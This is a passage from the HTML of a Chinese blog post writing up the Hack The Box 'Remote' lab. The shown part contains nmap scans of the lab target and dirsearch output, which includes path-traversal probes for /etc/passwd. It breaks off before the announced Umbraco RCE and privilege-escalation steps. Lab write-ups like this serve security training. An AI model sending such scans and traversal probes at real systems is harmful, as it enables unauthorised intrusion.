@@ -1,0 +1,822 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="shiyan">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="0x00 靶场技能介绍章节技能：目录扫描、nfs服务挂载、Umbraco 凭证文件搜集、哈希破解、Umbraco RCE漏洞利用、POC代码修改、teamviever 7 凭证读取、烂土豆提权">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Remote-htb-writeup">
+<meta property="og:url" content="https://sh1yan.top/2024/03/16/Remote-htb-writeup/index.html">
+<meta property="og:site_name" content="sh1yan&#39;blog">
+<meta property="og:description" content="0x00 靶场技能介绍章节技能：目录扫描、nfs服务挂载、Umbraco 凭证文件搜集、哈希破解、Umbraco RCE漏洞利用、POC代码修改、teamviever 7 凭证读取、烂土豆提权">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://sh1yan.top/photo/Remote-htb-writeup/1.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Remote-htb-writeup/2.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Remote-htb-writeup/3.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Remote-htb-writeup/4.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Remote-htb-writeup/5.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Remote-htb-writeup/6.png">
+<meta property="article:published_time" content="2024-03-16T15:50:55.000Z">
+<meta property="article:modified_time" content="2024-03-27T02:49:31.277Z">
+<meta property="article:author" content="shiyan">
+<meta property="article:tag" content="shooting-range">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://sh1yan.top/photo/Remote-htb-writeup/1.png">
+  
+  
+  
+  <title>Remote-htb-writeup - sh1yan&#39;blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"sh1yan.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>sh1yan&#39;blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/yqlj/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-th-large"></i>
+                <span>其他</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/open-source/" target="_self">
+                    
+                    <span>我开源的安全项目</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/rt-cmd/" target="_self">
+                    
+                    <span>反弹shell命令集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/P2note/" target="_self">
+                    
+                    <span>综合安全工具集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/WebDeveloper/" target="_self">
+                    
+                    <span>网站开发者工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/linux-command/" target="_self">
+                    
+                    <span>Linux命令工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/CyberChef/" target="_self">
+                    
+                    <span>CyberChef工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/Quick-Reference/" target="_self">
+                    
+                    <span>开发者速查备忘录</span>
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Remote-htb-writeup"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-03-16 23:50" pubdate>
+          2024年3月16日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          41k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          341 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Remote-htb-writeup</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h4 id="0x00-靶场技能介绍"><a href="#0x00-靶场技能介绍" class="headerlink" title="0x00 靶场技能介绍"></a>0x00 靶场技能介绍</h4><p>章节技能：目录扫描、nfs服务挂载、Umbraco 凭证文件搜集、哈希破解、Umbraco RCE漏洞利用、POC代码修改、teamviever 7 凭证读取、烂土豆提权</p>
+<span id="more"></span>  
+
+<p>参考链接：部分参考引导模式</p>
+<h4 id="0x01-用户权限获取"><a href="#0x01-用户权限获取" class="headerlink" title="0x01 用户权限获取"></a>0x01 用户权限获取</h4><p>1、获取下靶机IP地址：10.10.10.180</p>
+<p>2、扫描下开放端口情况</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo nmap -p- --min-rate <span class="hljs-number">10000</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.180</span><br>Starting Nmap <span class="hljs-number">7.94</span>SVN ( https:<span class="hljs-comment">//nmap.org ) at 2024-03-16 10:13 CST</span><br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.180</span><br>Host is up (<span class="hljs-number">0.29</span>s latency).<br>Not shown: <span class="hljs-number">65519</span> closed tcp ports (reset)<br>PORT      STATE SERVICE<br><span class="hljs-number">21</span>/tcp    open  ftp<br><span class="hljs-number">80</span>/tcp    open  http<br><span class="hljs-number">111</span>/tcp   open  rpcbind<br><span class="hljs-number">135</span>/tcp   open  msrpc<br><span class="hljs-number">139</span>/tcp   open  netbios-ssn<br><span class="hljs-number">445</span>/tcp   open  microsoft-ds<br><span class="hljs-number">2049</span>/tcp  open  nfs<br><span class="hljs-number">5985</span>/tcp  open  wsman<br><span class="hljs-number">47001</span>/tcp open  winrm<br><span class="hljs-number">49664</span>/tcp open  unknown<br><span class="hljs-number">49665</span>/tcp open  unknown<br><span class="hljs-number">49666</span>/tcp open  unknown<br><span class="hljs-number">49667</span>/tcp open  unknown<br><span class="hljs-number">49678</span>/tcp open  unknown<br><span class="hljs-number">49679</span>/tcp open  unknown<br><span class="hljs-number">49680</span>/tcp open  unknown<br><br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">13.15</span> seconds<br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo nmap -p21,<span class="hljs-number">80</span>,<span class="hljs-number">111</span>,<span class="hljs-number">135</span>,<span class="hljs-number">139</span>,<span class="hljs-number">445</span>,<span class="hljs-number">2049</span>,<span class="hljs-number">5985</span>,<span class="hljs-number">47001</span> -sV -sC --min-rate=<span class="hljs-number">10000</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.180</span><br>Starting Nmap <span class="hljs-number">7.94</span>SVN ( https:<span class="hljs-comment">//nmap.org ) at 2024-03-16 10:15 CST</span><br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.180</span><br>Host is up (<span class="hljs-number">0.35</span>s latency).<br><br>PORT      STATE SERVICE       VERSION<br><span class="hljs-number">21</span>/tcp    open  ftp           Microsoft ftpd<br>| ftp-syst: <br>|_  SYST: Windows_NT<br>|_ftp-anon: Anonymous FTP login allowed (FTP code <span class="hljs-number">230</span>)<br><span class="hljs-number">80</span>/tcp    open  http          Microsoft HTTPAPI httpd <span class="hljs-number">2.0</span> (SSDP/UPnP)<br>|_http-title: Home - Acme Widgets<br><span class="hljs-number">111</span>/tcp   open  rpcbind       <span class="hljs-number">2</span><span class="hljs-number">-4</span> (RPC #<span class="hljs-number">100000</span>)<br>| rpcinfo: <br>|   program version    port/proto  service<br>|   <span class="hljs-number">100000</span>  <span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>        <span class="hljs-number">111</span>/tcp   rpcbind<br>|   <span class="hljs-number">100000</span>  <span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>        <span class="hljs-number">111</span>/tcp6  rpcbind<br>|   <span class="hljs-number">100000</span>  <span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>        <span class="hljs-number">111</span>/udp   rpcbind<br>|   <span class="hljs-number">100000</span>  <span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>        <span class="hljs-number">111</span>/udp6  rpcbind<br>|   <span class="hljs-number">100003</span>  <span class="hljs-number">2</span>,<span class="hljs-number">3</span>         <span class="hljs-number">2049</span>/udp   nfs<br>|   <span class="hljs-number">100003</span>  <span class="hljs-number">2</span>,<span class="hljs-number">3</span>         <span class="hljs-number">2049</span>/udp6  nfs<br>|   <span class="hljs-number">100003</span>  <span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>       <span class="hljs-number">2049</span>/tcp   nfs<br>|   <span class="hljs-number">100003</span>  <span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>       <span class="hljs-number">2049</span>/tcp6  nfs<br>|   <span class="hljs-number">100005</span>  <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>       <span class="hljs-number">2049</span>/tcp   mountd<br>|   <span class="hljs-number">100005</span>  <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>       <span class="hljs-number">2049</span>/tcp6  mountd<br>|   <span class="hljs-number">100005</span>  <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>       <span class="hljs-number">2049</span>/udp   mountd<br>|   <span class="hljs-number">100005</span>  <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>       <span class="hljs-number">2049</span>/udp6  mountd<br>|   <span class="hljs-number">100021</span>  <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>     <span class="hljs-number">2049</span>/tcp   nlockmgr<br>|   <span class="hljs-number">100021</span>  <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>     <span class="hljs-number">2049</span>/tcp6  nlockmgr<br>|   <span class="hljs-number">100021</span>  <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>     <span class="hljs-number">2049</span>/udp   nlockmgr<br>|   <span class="hljs-number">100021</span>  <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>     <span class="hljs-number">2049</span>/udp6  nlockmgr<br>|   <span class="hljs-number">100024</span>  <span class="hljs-number">1</span>           <span class="hljs-number">2049</span>/tcp   status<br>|   <span class="hljs-number">100024</span>  <span class="hljs-number">1</span>           <span class="hljs-number">2049</span>/tcp6  status<br>|   <span class="hljs-number">100024</span>  <span class="hljs-number">1</span>           <span class="hljs-number">2049</span>/udp   status<br>|_  <span class="hljs-number">100024</span>  <span class="hljs-number">1</span>           <span class="hljs-number">2049</span>/udp6  status<br><span class="hljs-number">135</span>/tcp   open  msrpc         Microsoft Windows RPC<br><span class="hljs-number">139</span>/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn<br><span class="hljs-number">445</span>/tcp   open  microsoft-ds?<br><span class="hljs-number">2049</span>/tcp  open  nlockmgr      <span class="hljs-number">1</span><span class="hljs-number">-4</span> (RPC #<span class="hljs-number">100021</span>)<br><span class="hljs-number">5985</span>/tcp  open  http          Microsoft HTTPAPI httpd <span class="hljs-number">2.0</span> (SSDP/UPnP)<br>|_http-server-header: Microsoft-HTTPAPI/<span class="hljs-number">2.0</span><br>|_http-title: Not Found<br><span class="hljs-number">47001</span>/tcp open  http          Microsoft HTTPAPI httpd <span class="hljs-number">2.0</span> (SSDP/UPnP)<br>|_http-server-header: Microsoft-HTTPAPI/<span class="hljs-number">2.0</span><br>|_http-title: Not Found<br>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br><br>Host script results:<br>| smb2-security-mode: <br>|   <span class="hljs-number">3</span>:<span class="hljs-number">1</span>:<span class="hljs-number">1</span>: <br>|_    Message signing enabled but not required<br>| smb2-time: <br>|   date: <span class="hljs-number">2024</span><span class="hljs-number">-03</span><span class="hljs-number">-16</span>T03:<span class="hljs-number">16</span>:<span class="hljs-number">27</span><br>|_  start_date: N/A<br>|_clock-skew: <span class="hljs-number">59</span>m59s<br><br>Service detection performed. Please report any incorrect results at https:<span class="hljs-comment">//nmap.org/submit/ .</span><br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">282.71</span> seconds<br></code></pre></td></tr></table></figure>
+
+<p>3、查看下开放端口的这几个网站的信息</p>
+<p><img src="http://sh1yan.top/photo/Remote-htb-writeup/1.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="http://sh1yan.top/photo/Remote-htb-writeup/2.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="http://sh1yan.top/photo/Remote-htb-writeup/3.png" srcset="/img/loading.gif" lazyload></p>
+<p>4、扫描下80端口的目录情况</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ dirsearch -u http:<span class="hljs-comment">//10.10.10.180/</span><br><br>  _|. _ _  _  _  _ _|_    v0<span class="hljs-number">.4</span><span class="hljs-number">.3</span><br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: <span class="hljs-number">25</span> | Wordlist size: <span class="hljs-number">11460</span><br><br>Output File: /home/kali/Desktop/reports/http_10<span class="hljs-number">.10</span><span class="hljs-number">.10</span><span class="hljs-number">.180</span>/__24<span class="hljs-number">-03</span><span class="hljs-number">-16</span>_10<span class="hljs-number">-18</span><span class="hljs-number">-32.</span>txt<br><br>Target: http:<span class="hljs-comment">//10.10.10.180/</span><br><br>[<span class="hljs-number">10</span>:<span class="hljs-number">18</span>:<span class="hljs-number">32</span>] Starting: <br>[<span class="hljs-number">10</span>:<span class="hljs-number">18</span>:<span class="hljs-number">36</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">312B</span>  - /%<span class="hljs-number">2</span>e%<span class="hljs-number">2</span>e<span class="hljs-comment">//google.com</span><br>[<span class="hljs-number">10</span>:<span class="hljs-number">18</span>:<span class="hljs-number">37</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">312B</span>  - /.%<span class="hljs-number">2</span>e/%<span class="hljs-number">2</span>e%<span class="hljs-number">2</span>e/%<span class="hljs-number">2</span>e%<span class="hljs-number">2</span>e/%<span class="hljs-number">2</span>e%<span class="hljs-number">2</span>e/etc/passwd             <br>[<span class="hljs-number">10</span>:<span class="hljs-number">18</span>:<span class="hljs-number">38</span>] <span class="hljs-number">404</span> -    <span class="hljs-number">2</span>KB - /.ashx                                            <br>[<span class="hljs-number">10</span>:<span class="hljs-number">18</span>:<span class="hljs-number">38</span>] <span class="hljs-number">404</span> -    <span class="hljs-number">2</span>KB - /.asmx<br>[<span class="hljs-number">10</span>:<span class="hljs-number">19</span>:<span class="hljs-number">00</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">312B</span>  - /\..\..\..\..\..\..\..\..\..\etc\passwd           <br>[<span class="hljs-number">10</span>:<span class="hljs-number">19</span>:<span class="hljs-number">03</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">2</span>KB - /about-us                                         <br>[<span class="hljs-number">10</span>:<span class="hljs-number">19</span>:<span class="hljs-number">08</span>] <span class="hljs-number">404</span> -    <span class="hljs-number">2</span>KB - /admin%<span class="hljs-number">20</span>/                                        <br>[<span class="hljs-number">10</span>:<span class="hljs-number">19</span>:<span class="hljs-number">09</span>] <span class="hljs-number">404</span> -    <span class="hljs-number">2</span>KB - /admin.                                           <br>[<span class="hljs-number">10</span>:<span class="hljs-number">19</span>:<span class="hljs-number">31</span>] <span class="hljs-number">404</span> -    <span class="hljs-number">2</span>KB - /asset..                                          <br>[<span class="hljs-number">10</span>:<span class="hljs-number">19</span>:<span class="hljs-number">34</span>] <span class="hljs-number">400</span> -   <span class="hljs-number">11B</span>  - /base/                                            <br>[<span class="hljs-number">10</span>:<span class="hljs-number">19</span>:<span class="hljs-number">34</span>] <span class="hljs-number">500</span> -    <span class="hljs-number">1</span>KB - /base/<span class="hljs-type">static</span>/c                                    <br>[<span class="hljs-number">10</span>:<span class="hljs-number">19</span>:<span class="hljs-number">37</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">2</span>KB - /blog                                             <br>[<span class="hljs-number">10</span>:<span class="hljs-number">19</span>:<span class="hljs-number">37</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">2</span>KB - /blog/<br>[<span class="hljs-number">10</span>:<span class="hljs-number">19</span>:<span class="hljs-number">38</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">312B</span>  - /cgi-bin/.%<span class="hljs-number">2</span>e/%<span class="hljs-number">2</span>e%<span class="hljs-number">2</span>e/%<span class="hljs-number">2</span>e%<span class="hljs-number">2</span>e/%<span class="hljs-number">2</span>e%<span class="hljs-number">2</span>e/etc/passwd     <br>[<span class="hljs-number">10</span>:<span class="hljs-number">19</span>:<span class="hljs-number">47</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">3</span>KB - /contact                                          <br>[<span class="hljs-number">10</span>:<span class="hljs-number">19</span>:<span class="hljs-number">47</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">3</span>KB - /contact.aspx                                     <br>[<span class="hljs-number">10</span>:<span class="hljs-number">19</span>:<span class="hljs-number">54</span>] <span class="hljs-number">400</span> -    <span class="hljs-number">3</span>KB - /docpicker/internal_proxy/https/<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">9043</span>/ibm/console<br>[<span class="hljs-number">10</span>:<span class="hljs-number">20</span>:<span class="hljs-number">10</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">2</span>KB - /home                                             <br>[<span class="hljs-number">10</span>:<span class="hljs-number">20</span>:<span class="hljs-number">10</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">2</span>KB - /home.aspx                                        <br>[<span class="hljs-number">10</span>:<span class="hljs-number">20</span>:<span class="hljs-number">14</span>] <span class="hljs-number">404</span> -    <span class="hljs-number">2</span>KB - /index.php.                                       <br>[<span class="hljs-number">10</span>:<span class="hljs-number">20</span>:<span class="hljs-number">14</span>] <span class="hljs-number">400</span> -    <span class="hljs-number">3</span>KB - /index.php::$DATA                                 <br>[<span class="hljs-number">10</span>:<span class="hljs-number">20</span>:<span class="hljs-number">15</span>] <span class="hljs-number">302</span> -  <span class="hljs-number">126B</span>  - /INSTALL  -&gt;  /umbraco/                           <br>[<span class="hljs-number">10</span>:<span class="hljs-number">20</span>:<span class="hljs-number">15</span>] <span class="hljs-number">302</span> -  <span class="hljs-number">126B</span>  - /Install  -&gt;  /umbraco/<br>[<span class="hljs-number">10</span>:<span class="hljs-number">20</span>:<span class="hljs-number">15</span>] <span class="hljs-number">302</span> -  <span class="hljs-number">126B</span>  - /install  -&gt;  /umbraco/                           <br>[<span class="hljs-number">10</span>:<span class="hljs-number">20</span>:<span class="hljs-number">16</span>] <span class="hljs-number">302</span> -  <span class="hljs-number">126B</span>  - /install/  -&gt;  /umbraco/                          <br>[<span class="hljs-number">10</span>:<span class="hljs-number">20</span>:<span class="hljs-number">16</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">1</span>KB - /intranet                                         <br>[<span class="hljs-number">10</span>:<span class="hljs-number">20</span>:<span class="hljs-number">18</span>] <span class="hljs-number">404</span> -    <span class="hljs-number">2</span>KB - /javax.faces.resource.../WEB-INF/web.xml.jsf      <br>[<span class="hljs-number">10</span>:<span class="hljs-number">20</span>:<span class="hljs-number">18</span>] <span class="hljs-number">404</span> -    <span class="hljs-number">2</span>KB - /javax.faces.resource.../                         <br>[<span class="hljs-number">10</span>:<span class="hljs-number">20</span>:<span class="hljs-number">19</span>] <span class="hljs-number">400</span> -    <span class="hljs-number">3</span>KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd                                                                                                         <br>[<span class="hljs-number">10</span>:<span class="hljs-number">20</span>:<span class="hljs-number">19</span>] <span class="hljs-number">400</span> -    <span class="hljs-number">3</span>KB - 